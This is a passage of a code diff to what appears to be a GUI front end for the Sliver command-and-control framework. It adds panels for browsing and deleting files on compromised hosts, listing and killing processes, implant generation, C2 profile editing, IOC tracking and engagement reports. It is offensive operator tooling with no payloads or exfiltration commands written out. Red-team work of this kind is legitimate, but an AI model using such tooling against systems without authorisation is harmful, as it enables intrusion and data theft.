+    }
+  });
+}
 document.getElementById('modal-overlay').addEventListener('click', e => { if (e.target.id === 'modal-overlay') hideModal(); });
 document.addEventListener('keydown', e => { if (e.key === 'Escape') hideModal(); });
 
@@ -1889,30 +2787,12 @@ function openGeneratePanel() {
       e.preventDefault(); const f = e.target;
       const req = { name:f.name.value, goos:f.goos.value, goarch:f.goarch.value, format:f.format.value, c2Url:f.c2Url.value, debug:f.debug.checked, beacon:f.beacon.checked, interval:parseInt(f.interval?.value)||60, jitter:parseInt(f.jitter?.value)||0 };
       document.getElementById('gen-status').style.display = 'flex';
-      const res = document.getElementById('gen-result');
-      res.textContent = '';
+      document.getElementById('gen-result').textContent = '';
       const r = await App().GenerateImplant(req).catch(e => ({error:String(e)}));
       document.getElementById('gen-status').style.display = 'none';
-      if (r.error) {
-        res.textContent = `[ERROR] ${r.error}`;
-        res.style.color = 'var(--accent)';
-        return;
-      }
-      // Build succeeded and is stored on the teamserver. Offer a local save that
-      // opens the dialog on a user click (so the spinner is gone and the dialog
-      // gets focus). The build is always retrievable from the Builds panel too.
-      res.style.color = 'var(--ok)';
-      res.innerHTML = `[OK] built <b>${esc(r.name)}</b> — stored on the teamserver. `;
-      const saveBtn = document.createElement('button');
-      saveBtn.className = 'btn small';
-      saveBtn.textContent = '💾 Save to disk';
-      saveBtn.addEventListener('click', async () => {
-        saveBtn.disabled = true; saveBtn.textContent = 'Saving…';
-        const s = await App().RegenerateBuild(r.name).catch(e => ({ error: String(e) }));
-        if (s.error) { toast('err', s.error); saveBtn.disabled = false; saveBtn.textContent = '💾 Save to disk'; }
-        else { saveBtn.textContent = '✓ Saved'; toast('ok', `Saved to ${s.path}`); }
-      });
-      res.appendChild(saveBtn);
+      const res = document.getElementById('gen-result');
+      res.textContent = r.error ? `[ERROR] ${r.error}` : `[OK] ${r.file}`;
+      res.style.color = r.error ? 'var(--accent)' : 'var(--ok)';
     });
   }, 0);
 }
@@ -2006,3 +2886,573 @@ document.getElementById('reconnect-cancel-btn').addEventListener('click', async 
   const wm = document.getElementById('panel-watermark');
   if (wm) wm.textContent = `Sliver GUI${bi && bi.version ? ' ' + bi.version : ''} · Made by Raj Kumar Mullapudi`;
 })();
+
+
+
+// ── File Browser Panel ───────────────────────────────────────────────────────
+async function openFileBrowser(sessionID) {
+  const dockId = `files-${sessionID}`;
+  if (openTabs[dockId]) { activateTab(dockId); return; }
+  openTabs[dockId] = { kind: 'dock' };
+  document.getElementById('empty-interact')?.remove();
+
+  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
+  tab.innerHTML = `<span>📁 Files: ${sessionID.slice(0,6)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
+  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
+  document.getElementById('interact-tabs').appendChild(tab);
+
+  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
+  panel.innerHTML = `<div style="display:flex;flex-direction:column;flex:1;min-height:0" id="fb-dock-${dockId}"><p style="padding:10px;color:var(--muted)">Loading file structure...</p></div>`;
+  document.getElementById('interact-panels').appendChild(panel);
+  activateTab(dockId);
+
+  // File type icon mapping
+  function fileIcon(name, isDir) {
+    if (isDir) return '📁';
+    const ext = (name.split('.').pop() || '').toLowerCase();
+    const map = {
+      exe:'⚙️', dll:'🔧', sys:'🖥️', msi:'📦', bat:'📜', cmd:'📜', ps1:'💠', psm1:'💠', psd1:'💠',
+      txt:'📄', log:'📋', cfg:'⚙️', ini:'⚙️', conf:'⚙️', xml:'📰', json:'📰', yaml:'📰', yml:'📰', toml:'📰',
+      html:'🌐', htm:'🌐', css:'🎨', js:'📐', ts:'📐', jsx:'📐', tsx:'📐', py:'🐍', go:'🔵', rs:'🦀', c:'©️', cpp:'©️', h:'©️', cs:'💜', java:'☕', rb:'💎', php:'🐘',
+      zip:'📦', rar:'📦', '7z':'📦', tar:'📦', gz:'📦', bz2:'📦', xz:'📦',
+      png:'🖼️', jpg:'🖼️', jpeg:'🖼️', gif:'🖼️', bmp:'🖼️', ico:'🖼️', svg:'🖼️', webp:'🖼️',
+      mp3:'🎵', wav:'🎵', flac:'🎵', ogg:'🎵', m4a:'🎵',
+      mp4:'🎬', avi:'🎬', mkv:'🎬', mov:'🎬', wmv:'🎬',
+      pdf:'📕', doc:'📘', docx:'📘', xls:'📗', xlsx:'📗', ppt:'📙', pptx:'📙', csv:'📊',
+      db:'🗃️', sqlite:'🗃️', sql:'🗃️', mdb:'🗃️',
+      key:'🔑', pem:'🔑', crt:'🔑', cer:'🔑', pfx:'🔑',
+      lnk:'🔗', url:'🔗', iso:'💿', img:'💿', vhd:'💿', vmdk:'💿',
+    };
+    return map[ext] || '📄';
+  }
+
+  function fileTypeLabel(name, isDir) {
+    if (isDir) return 'File Folder';
+    const ext = (name.split('.').pop() || '').toLowerCase();
+    const labels = {
+      exe:'Application', dll:'DLL Library', sys:'System File', msi:'Installer', bat:'Batch Script', cmd:'Command Script', ps1:'PowerShell Script',
+      txt:'Text File', log:'Log File', cfg:'Config File', ini:'Config File', xml:'XML File', json:'JSON File', yaml:'YAML File',
+      html:'HTML File', py:'Python Script', go:'Go Source', rs:'Rust Source', c:'C Source', cpp:'C++ Source', cs:'C# Source',
+      zip:'ZIP Archive', rar:'RAR Archive', tar:'TAR Archive', gz:'GZip Archive',
+      png:'PNG Image', jpg:'JPEG Image', jpeg:'JPEG Image', gif:'GIF Image', bmp:'Bitmap Image',
+      pdf:'PDF Document', doc:'Word Document', docx:'Word Document', xls:'Excel Spreadsheet', xlsx:'Excel Spreadsheet',
+      pem:'PEM Certificate', crt:'Certificate', key:'Private Key',
+    };
+    return labels[ext] || (ext ? ext.toUpperCase() + ' File' : 'Unknown File');
+  }
+
+  // Path helpers
+  function splitPath(p) {
+    p = (p || '').replace(/\\/g, '/').replace(/\/+$/, '');
+    if (!p || p === '.') return [];
+    return p.split('/').filter(Boolean);
+  }
+  function joinPath(parts) { return parts.length ? parts.join('/') : '.'; }
+
+  const history = [];
+  let histIdx = -1;
+  let currentPath = '.';
+
+  // Render the right preview panel from a file entry
+  function showPreview(f, fullPath) {
+    const pv = document.getElementById(`fb-preview-${dockId}`);
+    if (!pv) return;
+    if (!f) {
+      pv.innerHTML = `<div class="fb-preview-empty">Select a file to see details</div>`;
+      return;
+    }
+    const icon = fileIcon(f.name, f.isDir);
+    const typeLabel = fileTypeLabel(f.name, f.isDir);
+    const size = f.isDir ? '—' : fmtSize(f.size);
+    pv.innerHTML = `
+      <div class="fb-preview-icon">${icon}</div>
+      <div class="fb-preview-name">${esc(f.name)}</div>
+      <div class="fb-preview-type">${typeLabel}</div>
+      <div class="fb-preview-divider"></div>
+      <div class="fb-preview-row"><span class="fb-preview-label">Path</span><span class="fb-preview-val">${esc(fullPath)}</span></div>
+      <div class="fb-preview-row"><span class="fb-preview-label">Size</span><span class="fb-preview-val">${size}</span></div>
+      <div class="fb-preview-row"><span class="fb-preview-label">Mode</span><span class="fb-preview-val">${esc(f.mode || '—')}</span></div>
+      ${f.isDir ? `<div class="fb-preview-tip">Double-click to enter folder</div>` : `
+      <div class="fb-preview-actions">
+        <button class="fb-preview-btn" id="fb-dl-${dockId}" data-path="${esc(fullPath)}">⬇ Download</button>
+        <button class="fb-preview-btn danger" id="fb-del-${dockId}" data-path="${esc(fullPath)}">🗑 Delete</button>
+      </div>`}
+    `;
+    // Wire download (placeholder)
+    pv.querySelector(`#fb-dl-${dockId}`)?.addEventListener('click', () => {
+      toast('info', `Download: use 'download ${fullPath}' in the session console`);
+    });
+    // Wire delete
+    pv.querySelector(`#fb-del-${dockId}`)?.addEventListener('click', async () => {
+      const ok = await uiConfirm(`Delete '${f.name}'?`, { title: 'Delete File', okLabel: 'Delete', danger: true });
+      if (!ok) return;
+      const err = await App().FileBrowserDelete(sessionID, fullPath).catch(e => e.toString());
+      if (err) { toast('error', err); return; }
+      toast('ok', `Deleted: ${f.name}`);
+      renderDir(currentPath, false);
+    });
+  }
+
+  async function renderDir(path, addToHistory) {
+    const container = document.getElementById(`fb-dock-${dockId}`);
+    if (!container) return;
+    const result = await App().FileBrowserList(sessionID, path);
+    if (result.error) { toast('error', result.error); container.innerHTML = `<p style="padding:10px;color:var(--accent)">Error: ${esc(result.error)}</p>`; return; }
+    currentPath = result.path || path;
+
+    if (addToHistory !== false) {
+      histIdx++;
+      history.length = histIdx;
+      history.push(currentPath);
+    }
+
+    const parts = splitPath(currentPath);
+    let crumbs = '';
+    for (let i = 0; i < parts.length; i++) {
+      const partial = joinPath(parts.slice(0, i + 1));
+      crumbs += `<span class="fb-crumb" data-nav="${esc(partial)}">${esc(parts[i])}</span>`;
+      if (i < parts.length - 1) crumbs += '<span class="fb-sep">›</span>';
+    }
+
+    const sorted = (result.files || []).slice().sort((a, b) => {
+      if (a.isDir !== b.isDir) return a.isDir ? -1 : 1;
+      return (a.name || '').localeCompare(b.name || '');
+    });
+    const dirCount = sorted.filter(f => f.isDir).length;
+    const fileCount = sorted.length - dirCount;
+
+    let html = `<div class="file-browser">
+      <div class="fb-toolbar">
+        <button class="fb-nav-btn" id="fb-back-${dockId}" title="Back"${histIdx <= 0 ? ' disabled' : ''}>◀</button>
+        <button class="fb-nav-btn" id="fb-fwd-${dockId}" title="Forward"${histIdx >= history.length - 1 ? ' disabled' : ''}>▶</button>
+        <button class="fb-nav-btn" id="fb-up-${dockId}" title="Up one level">⬆</button>
+        <button class="fb-nav-btn" id="fb-refresh-${dockId}" title="Refresh">🔄</button>
+        <div class="fb-addressbar">${crumbs || '<span class="fb-crumb" style="color:var(--muted)">.</span>'}</div>
+      </div>
+      <div class="fb-body-split">
+        <div class="fb-left-pane">
+          <div class="fb-col-header">
+            <span></span><span>Name</span><span style="text-align:right">Size</span><span>Mode</span>
+          </div>
+          <div class="fb-list" id="fb-list-${dockId}">`;
+
+    sorted.forEach(f => {
+      const cls = f.isDir ? 'fb-item dir' : 'fb-item';
+      const icon = fileIcon(f.name, f.isDir);
+      const size = f.isDir ? '—' : fmtSize(f.size);
+      html += `<div class="${cls}" data-path="${esc(currentPath + '/' + f.name)}" data-name="${esc(f.name)}" data-dir="${f.isDir}" data-size="${f.size||0}" data-mode="${esc(f.mode||'')}">
+        <span class="fb-icon">${icon}</span>
+        <span class="fb-name">${esc(f.name)}</span>
+        <span class="fb-size">${size}</span>
+        <span class="fb-date">${esc(f.mode || '')}</span>
+      </div>`;
+    });
+
+    html += `</div></div>
+        <div class="fb-right-pane" id="fb-preview-${dockId}">
+          <div class="fb-preview-empty">Select a file to see details</div>
+        </div>
+      </div>
+      <div class="fb-status">
+        <span>${sorted.length} items</span>
+        <span>${dirCount} folders, ${fileCount} files</span>
+      </div>
+    </div>`;
+    container.innerHTML = html;
+
+    // Wire navigation
+    container.querySelector(`#fb-back-${dockId}`)?.addEventListener('click', () => { if (histIdx > 0) { histIdx--; renderDir(history[histIdx], false); } });
+    container.querySelector(`#fb-fwd-${dockId}`)?.addEventListener('click', () => { if (histIdx < history.length - 1) { histIdx++; renderDir(history[histIdx], false); } });
+    container.querySelector(`#fb-up-${dockId}`)?.addEventListener('click', () => { renderDir(currentPath + '/..'); });
+    container.querySelector(`#fb-refresh-${dockId}`)?.addEventListener('click', () => { renderDir(currentPath, false); });
+    container.querySelectorAll('.fb-crumb[data-nav]').forEach(c => c.addEventListener('click', () => renderDir(c.dataset.nav)));
+
+    // Row: single-click → preview; double-click → navigate into dir
+    let selectedItem = null;
+    container.querySelectorAll('.fb-item').forEach(item => {
+      item.addEventListener('click', () => {
+        if (selectedItem) selectedItem.classList.remove('selected');
+        item.classList.add('selected');
+        selectedItem = item;
+        const f = { name: item.dataset.name, isDir: item.dataset.dir === 'true', size: parseInt(item.dataset.size)||0, mode: item.dataset.mode };
+        showPreview(f, item.dataset.path);
+      });
+      item.addEventListener('dblclick', () => { if (item.dataset.dir === 'true') renderDir(item.dataset.path); });
+    });
+  }
+  renderDir(currentPath);
+}
+
+// ── Process Browser Panel ────────────────────────────────────────────────────
+async function openProcessBrowser(sessionID) {
+  const dockId = `procs-${sessionID}`;
+  if (openTabs[dockId]) { activateTab(dockId); return; }
+  openTabs[dockId] = { kind: 'dock' };
+  document.getElementById('empty-interact')?.remove();
+
+  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
+  tab.innerHTML = `<span>⚙️ Procs: ${sessionID.slice(0,6)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
+  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
+  document.getElementById('interact-tabs').appendChild(tab);
+
+  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
+  panel.innerHTML = `<div style="overflow:auto;flex:1;display:flex;flex-direction:column" id="pb-dock-${dockId}"><p style="padding:10px;color:var(--muted)">Loading processes...</p></div>`;
+  document.getElementById('interact-panels').appendChild(panel);
+  activateTab(dockId);
+
+  // Process icon based on executable name
+  function procIcon(exe, owner) {
+    const e = (exe || '').toLowerCase();
+    const o = (owner || '').toLowerCase();
+    if (e === 'system' || e === 'system idle process' || e === '[system process]') return '🖥️';
+    if (e === 'svchost.exe') return '🔩';
+    if (e === 'csrss.exe' || e === 'smss.exe' || e === 'wininit.exe' || e === 'winlogon.exe' || e === 'lsass.exe' || e === 'services.exe') return '🛡️';
+    if (e === 'explorer.exe') return '📁';
+    if (e === 'cmd.exe' || e === 'powershell.exe' || e === 'pwsh.exe' || e === 'conhost.exe' || e === 'windowsterminal.exe') return '💻';
+    if (e.includes('chrome') || e.includes('firefox') || e.includes('msedge') || e.includes('brave') || e.includes('opera')) return '🌐';
+    if (e.includes('defender') || e.includes('malware') || e.includes('antivirus') || e.includes('security')) return '🛡️';
+    if (e === 'taskmgr.exe' || e === 'procexp.exe' || e === 'procmon.exe') return '📊';
+    if (e === 'notepad.exe' || e === 'code.exe' || e.includes('devenv') || e.includes('sublime') || e.includes('vim')) return '📝';
+    if (e === 'mmc.exe' || e === 'regedit.exe') return '⚙️';
+    if (e === 'dwm.exe' || e === 'fontdrvhost.exe') return '🎨';
+    if (e === 'spoolsv.exe') return '🖨️';
+    if (e === 'audiodg.exe' || e.includes('audio')) return '🔊';
+    if (o.includes('system') || o.includes('local service') || o.includes('network service')) return '⚙️';
+    return '▪️';
+  }
+
+  async function loadProcs() {
+    const container = document.getElementById(`pb-dock-${dockId}`);
+    if (!container) return;
+    const result = await App().ProcessBrowserList(sessionID);
+    if (result.error) { toast('error', result.error); container.innerHTML = `<p style="padding:10px;color:var(--accent)">Error: ${esc(result.error)}</p>`; return; }
+
+    const allProcs = result.processes.sort((a, b) => a.pid - b.pid);
+
+    let html = `<div class="proc-browser">
+      <div class="proc-toolbar">
+        <input class="proc-search" id="proc-filter-${dockId}" type="text" placeholder="🔍 Filter processes..." />
+        <button class="proc-tb-btn" id="proc-refresh-${dockId}">🔄 Refresh</button>
+        <button class="proc-tb-btn danger" id="proc-kill-btn-${dockId}">☠️ Kill</button>
+        <button class="proc-tb-btn" id="proc-migrate-btn-${dockId}">🎯 Migrate</button>
+      </div>
+      <div class="proc-col-header">
+        <span></span><span>PID</span><span>PPID</span><span>Name</span><span>Owner</span><span>Arch</span>
+      </div>
+      <div class="proc-list" id="proc-rows-${dockId}">`;
+
+    allProcs.forEach(p => {
+      const icon = procIcon(p.executable, p.owner);
+      const o = (p.owner || '').toLowerCase();
+      const isSystem = o.includes('system') || o.includes('local service') || o.includes('network service');
+      const isSelf = p.sessionID === sessionID && (p.executable || '').toLowerCase().includes('implant'); // heuristic
+      const cls = isSystem ? 'proc-item proc-system' : (isSelf ? 'proc-item proc-highlight' : 'proc-item');
+      html += `<div class="${cls}" data-pid="${p.pid}" data-search="${esc((p.executable + ' ' + (p.owner || '') + ' ' + p.pid).toLowerCase())}">
+        <span class="proc-icon">${icon}</span>
+        <span class="proc-pid">${p.pid}</span>
+        <span class="proc-pid">${p.ppid}</span>
+        <span class="proc-exe">${esc(p.executable)}</span>
+        <span class="proc-owner">${esc(p.owner || '')}</span>
+        <span class="proc-arch">${esc(p.arch || '')}</span>
+      </div>`;
+    });
+
+    html += `</div>
+      <div class="proc-status">
+        <span id="proc-count-${dockId}">${allProcs.length} processes</span>
+        <span id="proc-selected-${dockId}">No process selected</span>
+      </div>
+    </div>`;
+    container.innerHTML = html;
+
+    // Search / filter
+    const filterInput = container.querySelector(`#proc-filter-${dockId}`);
+    const rowsContainer = container.querySelector(`#proc-rows-${dockId}`);
+    const countLabel = container.querySelector(`#proc-count-${dockId}`);
+    filterInput?.addEventListener('input', () => {
+      const q = filterInput.value.toLowerCase();
+      let visible = 0;
+      rowsContainer.querySelectorAll('.proc-item').forEach(row => {
+        const match = !q || (row.dataset.search || '').includes(q);
+        row.style.display = match ? '' : 'none';
+        if (match) visible++;
+      });
+      countLabel.textContent = q ? `${visible} / ${allProcs.length} processes` : `${allProcs.length} processes`;
+    });
+
+    // Row selection
+    let selectedPID = null;
+    container.querySelectorAll('.proc-item').forEach(item => {
+      item.addEventListener('click', () => {
+        container.querySelectorAll('.proc-item').forEach(i => i.classList.remove('selected'));
+        item.classList.add('selected');
+        selectedPID = parseInt(item.dataset.pid);
+        container.querySelector(`#proc-selected-${dockId}`).textContent = `Selected: PID ${selectedPID} — ${item.querySelector('.proc-exe')?.textContent || ''}`;
+      });
+    });
+
+    // Action buttons
+    container.querySelector(`#proc-refresh-${dockId}`)?.addEventListener('click', () => loadProcs());
+    container.querySelector(`#proc-kill-btn-${dockId}`)?.addEventListener('click', async () => {
+      if (!selectedPID) { toast('info', 'Select a process first'); return; }
+      const ok = await uiConfirm(`Kill PID ${selectedPID}?`, { title: 'Kill Process', okLabel: 'Kill', danger: true });
+      if (!ok) return;
+      await App().ProcessBrowserKill(sessionID, selectedPID);
+      toast('ok', `Killed PID ${selectedPID}`);
+      loadProcs();
+    });
+    container.querySelector(`#proc-migrate-btn-${dockId}`)?.addEventListener('click', () => {
+      if (!selectedPID) { toast('info', 'Select a process first'); return; }
+      toast('info', `Migrate into PID ${selectedPID} — use 'migrate ${selectedPID} <profile>' in console`);
+    });
+  }
+  loadProcs();
+}
+
+// ── Context Menu Handlers for File/Process Browser ───────────────────────────
+document.getElementById('ctx-files')?.addEventListener('click', () => {
+  if (activeCtxAgent && activeCtxAgent.kind === 'session') openFileBrowser(activeCtxAgent.obj.id);
+  else if (activeCtxAgent) toast('info', 'File browser requires an interactive session (not a beacon)');
+  document.getElementById('ctx-menu').classList.add('hidden');
+});
+document.getElementById('ctx-processes')?.addEventListener('click', () => {
+  if (activeCtxAgent && activeCtxAgent.kind === 'session') openProcessBrowser(activeCtxAgent.obj.id);
+  else if (activeCtxAgent) toast('info', 'Process browser requires an interactive session (not a beacon)');
+  document.getElementById('ctx-menu').classList.add('hidden');
+});
+
+// ── Auto-start timer on first beacon ─────────────────────────────────────────
+function onFirstAgent() {
+  if (!engagementTimerInterval) startEngagementTimer();
+  refreshKillChain();
+}
+
+// ── Sound on new beacon/session ──────────────────────────────────────────────
+function playBeaconSound() {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.frequency.value = 800;
+    osc.type = 'sine';
+    gain.gain.value = 0.1;
+    osc.start();
+    osc.stop(ctx.currentTime + 0.15);
+    setTimeout(() => {
+      const osc2 = ctx.createOscillator();
+      osc2.connect(gain);
+      osc2.frequency.value = 1200;
+      osc2.type = 'sine';
+      osc2.start();
+      osc2.stop(ctx.currentTime + 0.1);
+    }, 180);
+  } catch(e) {}
+}
+
+// ── IOC Tracker Panel ────────────────────────────────────────────────────────
+async function openIOCPanel() {
+  const iocs = await App().GetIOCs().catch(() => []);
+  const iocTypeColor = { file:'var(--warn)', service:'var(--accent)', regkey:'var(--info)', schtask:'var(--ok)', user:'var(--cyan)', cron:'var(--muted)' };
+
+  let html = `<div class="ioc-panel" style="display:flex;flex-direction:column;gap:0">
+    <div style="display:flex;gap:8px;padding:0 0 12px 0;align-items:center;flex-wrap:wrap">
+      <button id="ioc-cleanup-btn" class="btn small">Generate Cleanup Script</button>
+      <button id="ioc-add-btn" class="btn small">+ Add Manual IOC</button>
+      <button id="ioc-clear-btn" class="btn small">Clear All</button>
+      <span class="spacer"></span>
+      <span style="color:var(--muted);font-size:11px">${iocs.length} IOC(s) tracked</span>
+    </div>`;
+
+  if (iocs.length === 0) {
+    html += `<div style="padding:24px 0;text-align:center;color:var(--muted);font-size:12px">
+      <div style="font-size:28px;margin-bottom:8px">🔍</div>
+      No IOCs tracked yet.<br>IOCs are recorded automatically when persistence/spawn scripts run.
+    </div>`;
+  } else {
+    html += `<table class="data-table" style="font-size:11px"><thead><tr>
+      <th>#</th><th>Time</th><th>Host</th><th>Type</th><th>Path</th><th>Detail</th>
+    </tr></thead><tbody>`;
+    iocs.forEach(i => {
+      const col = iocTypeColor[i.type] || 'var(--muted)';
+      html += `<tr>
+        <td style="color:var(--muted);font-family:var(--mono)">${i.id}</td>
+        <td style="color:var(--muted)">${i.timestamp}</td>
+        <td>${esc(i.host)}</td>
+        <td><span style="color:${col};font-weight:700;font-size:10px;text-transform:uppercase;background:${col}18;border:1px solid ${col}40;padding:1px 6px;border-radius:3px">${i.type}</span></td>
+        <td style="font-family:var(--mono);color:var(--text-dim)">${esc(i.path)}</td>
+        <td style="color:var(--muted)">${esc(i.detail)}</td>
+      </tr>`;
+    });
+    html += '</tbody></table>';
+  }
+  html += '<pre id="ioc-script-output" class="scr-output" style="display:none;margin-top:12px"></pre></div>';
+
+  openViewPanel('iocs', 'IOC Tracker', html);
+
+  document.getElementById('ioc-cleanup-btn')?.addEventListener('click', async () => {
+    const script = await App().GenerateCleanupScript();
+    const out = document.getElementById('ioc-script-output');
+    out.style.display = 'block';
+    out.textContent = script;
+  });
+  document.getElementById('ioc-clear-btn')?.addEventListener('click', async () => {
+    const ok = await uiConfirm('Clear all tracked IOCs?', { title: 'Clear IOCs', okLabel: 'Clear', danger: true });
+    if (!ok) return;
+    await App().ClearIOCs();
+    openIOCPanel();
+  });
+  document.getElementById('ioc-add-btn')?.addEventListener('click', async () => {
+    const host = await uiPrompt('Host (IP or hostname):', '', { title: 'Add IOC – Host' });
+    if (!host) return;
+    const type = await uiPrompt('Type (file/service/regkey/schtask/user/cron):', 'file', { title: 'Add IOC – Type' });
+    if (!type) return;
+    const path = await uiPrompt('Path / Name:', '', { title: 'Add IOC – Path' });
+    if (!path) return;
+    const detail = await uiPrompt('Detail (optional):', '', { title: 'Add IOC – Detail' }) || '';
+    await App().AddIOC(host, type, path, detail);
+    openIOCPanel();
+  });
+}
+
+// ── Export Report ────────────────────────────────────────────────────────────
+async function exportReport() {
+  const report = await App().GenerateReport().catch(e => '# Error generating report\n\n' + e);
+  const html = `<div style="display:flex;flex-direction:column;gap:10px;flex:1;min-height:0">
+    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+      <button id="report-copy-btn" class="btn small">Copy to Clipboard</button>
+      <button id="report-console-btn" class="btn small">Print to Console</button>
+      <span id="report-status" style="color:var(--muted);font-size:11px"></span>
+    </div>
+    <pre id="report-content" class="scr-output" style="flex:1;min-height:300px;overflow:auto;white-space:pre-wrap;word-break:break-word;font-size:11.5px;line-height:1.6">${esc(report)}</pre>
+  </div>`;
+  openViewPanel('_report', 'Engagement Report', html);
+
+  document.getElementById('report-copy-btn')?.addEventListener('click', () => {
+    navigator.clipboard.writeText(report).then(() => {
+      document.getElementById('report-status').textContent = 'Copied!';
+      toast('ok', 'Report copied to clipboard');
+    }).catch(() => {
+      const el = document.getElementById('report-content');
+      const range = document.createRange(); range.selectNodeContents(el);
+      const sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(range);
+      document.getElementById('report-status').textContent = 'Text selected — Ctrl+C to copy';
+    });
+  });
+
+  document.getElementById('report-console-btn')?.addEventListener('click', () => {
+    // Print the report into the active session console tab
+    const panelId = activeInteractId ? `ip-${activeInteractId}` : null;
+    const out = panelId ? document.querySelector(`#${panelId} .console-out`) : null;
+    if (out) {
+      const block = document.createElement('div');
+      block.className = 'out';
+      block.style.cssText = 'white-space:pre-wrap;color:var(--text-dim);font-size:11px;border-top:1px solid var(--border);padding:8px 0;margin-top:4px';
+      block.textContent = report;
+      out.appendChild(block);
+      out.scrollTop = out.scrollHeight;
+      hideModal();
+      toast('ok', 'Report printed to console');
+    } else {
+      toast('info', 'Open a session tab first, then use Print to Console');
+    }
+  });
+}
+
+// ── C2 Profile Editor ─────────────────────────────────────────────────────────
+async function openC2ProfileEditor() {
+  const profiles = await App().ListHTTPC2Profiles().catch(() => []);
+  let profileOpts = profiles.length
+    ? profiles.map(p => `<div class="c2p-item" data-name="${esc(p.name)}">${esc(p.name)}</div>`).join('')
+    : '<div style="color:var(--muted);padding:10px;font-size:11px">No HTTP C2 profiles found</div>';
+
+  const html = `<div class="c2-editor">
+    <div class="c2-left">
+      <div class="c2-list-header">HTTP C2 Profiles</div>
+      <div class="c2-profile-list" id="c2-profile-list">${profileOpts}</div>
+      <div class="c2-list-footer">
+        <button class="btn small" id="c2-new-btn">+ New Profile</button>
+      </div>
+    </div>
+    <div class="c2-right">
+      <div class="c2-editor-toolbar">
+        <span class="c2-editor-name" id="c2-active-name">Select a profile to edit</span>
+        <span class="spacer"></span>
+        <button class="btn small" id="c2-save-btn">Save (Overwrite)</button>
+        <button class="btn small" id="c2-save-new-btn">Save as New</button>
+      </div>
+      <textarea class="c2-json-editor" id="c2-json-editor" placeholder='{ &quot;name&quot;: &quot;my-profile&quot;, ... }' spellcheck="false"></textarea>
+      <div class="c2-editor-status" id="c2-editor-status"></div>
+    </div>
+  </div>`;
+
+  openViewPanel('c2profiles', 'C2 Profile Editor', html);
+
+  const editor = document.getElementById('c2-json-editor');
+  const status = document.getElementById('c2-editor-status');
+  const activeName = document.getElementById('c2-active-name');
+  let currentProfileName = null;
+
+  // Load profile into editor
+  async function loadProfile(name) {
+    status.textContent = 'Loading...';
+    const json = await App().GetHTTPC2Profile(name).catch(e => null);
+    if (!json) { status.textContent = 'Failed to load profile'; return; }
+    editor.value = json;
+    currentProfileName = name;
+    activeName.textContent = name;
+    status.textContent = `Loaded: ${name}`;
+    document.querySelectorAll('.c2p-item').forEach(el => el.classList.toggle('active', el.dataset.name === name));
+  }
+
+  document.querySelectorAll('.c2p-item').forEach(el => {
+    el.addEventListener('click', () => loadProfile(el.dataset.name));
+  });
+
+  document.getElementById('c2-save-btn')?.addEventListener('click', async () => {
+    const json = editor.value.trim();
+    if (!json) { status.textContent = 'Editor is empty'; return; }
+    status.textContent = 'Saving...';
+    const err = await App().SaveHTTPC2Profile(json, true).catch(e => e.toString());
+    if (err) { status.textContent = 'Error: ' + err; toast('error', err); return; }
+    status.textContent = 'Saved!';
+    toast('ok', 'C2 profile saved (overwrite)');
+  });
+
+  document.getElementById('c2-save-new-btn')?.addEventListener('click', async () => {
+    const json = editor.value.trim();
+    if (!json) { status.textContent = 'Editor is empty'; return; }
+    status.textContent = 'Saving as new...';
+    const err = await App().SaveHTTPC2Profile(json, false).catch(e => e.toString());
+    if (err) { status.textContent = 'Error: ' + err; toast('error', err); return; }
+    status.textContent = 'Saved as new profile!';
+    toast('ok', 'New C2 profile created');
+    openC2ProfileEditor(); // refresh list
+  });
+
+  document.getElementById('c2-new-btn')?.addEventListener('click', () => {
+    editor.value = JSON.stringify({ name: 'new-profile', implantConfig: {}, serverConfig: {} }, null, 2);
+    currentProfileName = null;
+    activeName.textContent = 'New Profile';
+    status.textContent = 'Edit JSON and click "Save as New"';
+    document.querySelectorAll('.c2p-item').forEach(el => el.classList.remove('active'));
+  });
+}
+
+// Wire up sound & count check interval
+if (typeof window !== 'undefined') {
+  let lastAgentCount = 0;
+  setInterval(async () => {
+    try {
+      const sessions = await App().ListSessions().catch(() => []);
+      const beacons = await App().ListBeacons().catch(() => []);
+      const total = (sessions?.length || 0) + (beacons?.length || 0);
+      if (total > lastAgentCount && lastAgentCount > 0) {
+        playBeaconSound();
+      }
+      lastAgentCount = total;
+    } catch(e) {}
+  }, 5000);
+}
+
